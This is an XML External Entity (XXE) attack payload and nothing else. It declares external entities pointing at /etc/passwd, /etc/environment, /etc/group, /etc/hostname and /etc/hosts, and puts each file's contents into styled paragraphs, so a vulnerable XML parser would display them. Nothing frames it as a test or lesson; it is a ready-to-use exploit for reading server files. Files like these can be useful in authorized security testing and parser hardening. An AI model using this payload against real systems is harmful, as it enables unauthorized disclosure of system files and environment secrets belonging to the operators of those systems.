<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE p [
<!ENTITY passwd SYSTEM "file:///etc/passwd">
<!ENTITY env SYSTEM "file:///etc/environment">
<!ENTITY group SYSTEM "file:///etc/group">
<!ENTITY hostname SYSTEM "file:///etc/hostname">
<!ENTITY hosts SYSTEM "file:///etc/hosts">
]> 

<p>
  <p style="border-style: dotted;">/etc/passwd: 
&passwd;
  </p>
  <p style="border-style: dotted;">/etc/environment:
&env;
  </p>
  <p style="border-style: dotted;">/etc/group:
&group;
  </p>
  <p style="border-style: dotted;">/etc/hostname:
&hostname;
  </p>
  <p style="border-style: dotted;">/etc/hosts:
&hosts;
  </p>
</p>